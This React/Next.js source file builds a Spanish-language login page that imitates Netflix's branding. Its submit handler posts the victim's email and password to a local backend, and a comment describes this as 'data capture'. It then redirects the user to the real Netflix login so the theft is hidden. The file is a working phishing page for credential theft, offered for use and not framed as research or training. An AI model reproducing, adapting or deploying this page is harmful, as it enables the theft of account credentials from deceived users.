"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"

export default function LoginPage() {
  const [loginMethod, setLoginMethod] = useState<"password" | "code">("password")
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      // Send data to backend
      const response = await fetch('http://localhost:5000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      
      if (response.ok) {
        // Redirect to real Netflix after successful data capture
        window.location.href = 'https://www.netflix.com/login';
      }
    } catch (error) {
      console.error('Error:', error);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Background Image with Gradient Overlay */}
      <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black z-0">
          <div className="absolute inset-0 bg-[url('/background_fill.jpg')] bg-cover bg-center opacity-80 mix-blend-overlay"></div>
      </div>

      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-4 py-6 md:px-12">
        <div className="w-32 md:w-40">
          <Link href="/">
            <Image src="/netflix-logo.png" alt="Netflix" width={167} height={45} priority />
          </Link>
        </div>
      </header>

      {/* Login Container */}
      <main className="relative z-10 mx-auto max-w-md px-4 py-12">
        <div className="w-full max-w-md mx-auto bg-black/50 p-8 rounded">
          <h1 className="mb-6 text-3xl font-bold">Iniciar sesión</h1>

          {loginMethod === "password" ? (
            /* Password Login Form */
            <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <input
                    type="email"
                    placeholder="Email o número de celular"
                    className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white focus:bg-[#454545]/30 focus:border-red-600"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onBlur={(e) => {
                    const isValid = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(e.target.value);
                    e.target.setCustomValidity(isValid ? "" : "Email inválido");
                    }}
                    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                    required
                  />
                  {email && !/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(email) && (
                    <p className="text-[#e50914] text-xs mt-1 ml-1">
                    Por favor ingresa un correo electrónico válido
                    </p>
                  )}
                </div>
              <div>
                <input
                  type="password"
                  placeholder="Contraseña"
                  className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white  focus:bg-[#454545]/30 focus:border-red-600"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>
              <button type="submit" className="w-full rounded bg-[#e50914] p-3 font-bold text-white hover:bg-[#964f4f]">
                Iniciar sesión
              </button>

              <div className="flex items-center justify-center">
                <div className="relative flex w-full items-center justify-center">
                  {/* <div className="absolute w-full border-t border-gray-600"></div> */}
                  <span className="relative bg-black/0 px-2 text-white">O</span>
                </div>
              </div>

              <button
                onClick={() => setLoginMethod("code")}
                className="w-full rounded bg-[#333] p-3 text-white font-bold hover:bg-[#454545]"
              >
                Usar un código de inicio de sesión
              </button>

              <div className="text-center">
                <Link href="#" className="text-sm text-white underline hover:underline">
                  ¿Olvidaste la contraseña?
                </Link>
              </div>

              <div className="flex items-center gap-1">
                <input type="checkbox" id="remember" className="h-4 w-4" />
                <label htmlFor="remember" className="text-sm text-white">
                  Recordarme
                </label>
              </div>

              <div className="pt-2 text-sm text-[#B3B3B3]">
                ¿Primera vez en Netflix?
                <Link href="/" className="ml-1 text-white hover:underline">
                  Suscríbete ya.
                </Link>
              </div>

              <div className="pt-4 text-xs text-[#808080]">
                Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                <Link href="#" className="ml-1 text-[#0071eb] hover:underline">
                  Más info.
                </Link>
              </div>
            </form>
          ) : (
            /* Code Login Form */
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Email o número de celular"
                  className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white  focus:bg-[#454545]/30 focus:border-red-600"
                />
              </div>
              <p className="text-center text-sm text-[#B3B3B3]">Pueden aplicar tarifas de SMS y datos</p>
              <button className="w-full rounded bg-[#e50914] p-3 font-bold text-white hover:bg-[#f40612]">
                Enviar código de inicio de sesión
              </button>

              <div className="flex items-center justify-center">
                <div className="relative flex w-full items-center justify-center">
                  {/* <div className="absolute w-full border-t border-gray-600"></div> */}
                  <span className="relative bg-black/0 px-2 text-white">O</span>
                </div>
              </div>

              <button
                onClick={() => setLoginMethod("password")}
                className="w-full rounded bg-[#333] p-3 text-white font-bold hover:bg-[#454545]"
              >
                Usar contraseña
              </button>

              <div className="text-center">
                <Link href="#" className="text-sm text-white underline hover:underline hover:text-[#808080]">
                  ¿Olvidaste tu email o número de teléfono?
                </Link>
              </div>

              <div className="flex items-center gap-1">
                <input type="checkbox" id="remember-code" className="h-4 w-4" />
                <label htmlFor="remember-code" className="text-sm text-gray-400">
                  Recordarme
                </label>
              </div>

              <div className="pt-2 text-sm text-[#B3B3B3]">
                ¿Primera vez en Netflix?
                <Link href="/" className="ml-1 text-white hover:underline">
                  Suscríbete ya.
                </Link>
              </div>

              <div className="pt-4 text-xs text-[#808080]">
                Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                <Link href="#" className="ml-1 text-[#0071eb] hover:underline">
                  Más info.
                </Link>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="relative z-10 mt-auto border-t border-[#232323] bg-[#161616] py-8">
        <div className="mx-auto max-w-6xl px-4">
          <p className="mb-6 text-[#9fb9b9]">
            ¿Preguntas? Llama al{" "}
            <a href="tel:8009531430">
              800 953 1430 (sin cargo)
            </a>
          </p>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs text-[#9fb9b9]">
            <Link href="#" className="hover:underline">
              Preguntas frecuentes
            </Link>
            <Link href="#" className="hover:underline">
              Centro de ayuda
            </Link>
            <Link href="#" className="hover:underline">
              Tienda de Netflix
            </Link>
            <Link href="#" className="hover:underline">
              Términos de uso
            </Link>
            <Link href="#" className="hover:underline">
              Privacidad
            </Link>
            <Link href="#" className="hover:underline">
              Preferencias de cookies
            </Link>
            <Link href="#" className="hover:underline">
              Información empresarial
            </Link>
          </div>

          <div className="mt-6">
            <select className="appearance-none bg-black border border-gray-700 rounded px-2 py-1 pr-6 text-sm text-gray-400">
              <option>Español</option>
              <option>English</option>
            </select>
          </div>
        </div>
      </footer>
    </div>
  )
}

